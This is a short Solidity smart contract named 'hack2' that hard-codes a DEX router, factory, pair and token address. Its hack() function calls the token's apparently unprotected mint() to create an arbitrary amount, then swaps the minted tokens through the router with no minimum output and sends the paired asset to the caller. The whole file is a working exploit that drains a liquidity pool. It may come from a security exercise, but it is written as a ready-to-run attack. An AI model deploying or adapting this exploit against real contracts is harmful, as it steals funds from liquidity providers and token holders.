// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

interface pair{
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address); 
    function token1() external view returns (address);
}

interface Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface Factory{
    function getPair(address tokenA, address tokenB) external view returns (address pair);

}

interface token{
    function mint(uint256 amount) external;
}


contract hack2 {
    Router public r = Router(0x5D1FC0411cFBBb5dc9c08e4b47D23Ac7C6911352);
    Factory public f = Factory(0x6D151a84fcDEd8478a60b367bf26AA6134A215e5);
    pair public p;
    token public t= token(0x00D4916ca58548CD9D4E8DF6dCf85C8571b13D24);


    constructor() {
        p = pair(f.getPair(0xc17be79D7765B09dB5f3BE5f6Fbc92601A36cb73, 0x00D4916ca58548CD9D4E8DF6dCf85C8571b13D24));

    }

    function hack_view() public view returns(uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast){
        return p.getReserves();

    }
    function hack(uint256 amount) external{
        t.mint(amount);
        
        address[] memory path = new address[](2);
        
        path[0]= 0x00D4916ca58548CD9D4E8DF6dCf85C8571b13D24;
        path[1]= 0xc17be79D7765B09dB5f3BE5f6Fbc92601A36cb73;

        r.swapExactTokensForTokens(amount, 0, path, msg.sender, block.timestamp);
    }

   
}
